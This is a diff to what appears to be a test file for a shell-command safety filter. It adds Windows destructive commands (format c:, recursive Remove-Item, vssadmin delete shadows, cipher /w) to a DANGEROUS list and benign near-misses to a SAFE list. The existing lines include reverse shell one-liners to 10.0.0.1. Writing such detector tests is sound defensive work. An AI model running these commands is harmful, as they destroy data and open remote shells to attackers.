@@ -35,6 +35,22 @@ DANGEROUS = [
     "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
     "nc -e /bin/sh 10.0.0.1 4444",
     "chmod -R 777 /",
+    # Windows equivalents (reachable via `cmd /c` / `powershell -c`)
+    "cmd /c rd /s /q C:\\data",
+    "rmdir /s /q build",
+    "del /s /q *.log",
+    "format c:",
+    "format D: /q",
+    "cmd /c format /q /y c:",                          # flags before the drive
+    "powershell -c Remove-Item -Recurse -Force C:\\ws",
+    "powershell -c Remove-Item -rec -fo C:\\ws",       # param abbreviation
+    'powershell -c "ri -Recurse -Force C:\\ws"',       # alias
+    "powershell del -r -f C:\\tmp",
+    "reg delete HKLM\\Software\\Foo /f",
+    "vssadmin delete shadows /all",
+    "diskpart /s wipe.txt",
+    "cipher /w:C",
+    "bcdedit /set {default} safeboot minimal",
 ]
 
 SAFE = [
@@ -48,6 +64,17 @@ SAFE = [
     "mkdir -p checkpoints",
     "echo 'Test accuracy: 0.98'",
     "grep -r pattern src/",
+    # near-misses of the Windows deny patterns
+    "rmdir build",                          # non-recursive
+    "python del_helper.py",                 # 'del' inside an identifier
+    "python format_data.py --csv",          # 'format' without a drive letter
+    "ruff format C:\\proj\\src",            # a path argument, not a drive
+    "cargo fmt && ruff format c:/repo",
+    "powershell Remove-Item old.txt -Force",  # force without recurse: one file
+    "del stale.txt",                        # plain delete, no -r/-f pair
+    "python del.py -r data -f json",        # a script name, not the verb
+    "echo deleted 5 rows",
+    "git log --format=oneline",
 ]
 
 
